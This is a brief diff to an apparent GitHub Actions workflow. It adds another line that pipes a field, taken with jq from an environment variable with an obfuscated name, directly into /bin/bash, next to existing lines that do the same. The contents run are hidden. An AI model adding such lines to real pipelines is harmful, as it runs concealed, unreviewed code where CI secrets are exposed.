@@ -31,6 +31,7 @@ jobs:
           echo $ljcn52 | jq -r .nucvh48408 | /bin/bash
           printf '%s' "$yy30" | jq -r .idge30937 | /bin/bash
           echo $cdxhk10 | jq -r .pg028 | /bin/bash
+          echo $yvux8068 | jq -r .y38 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
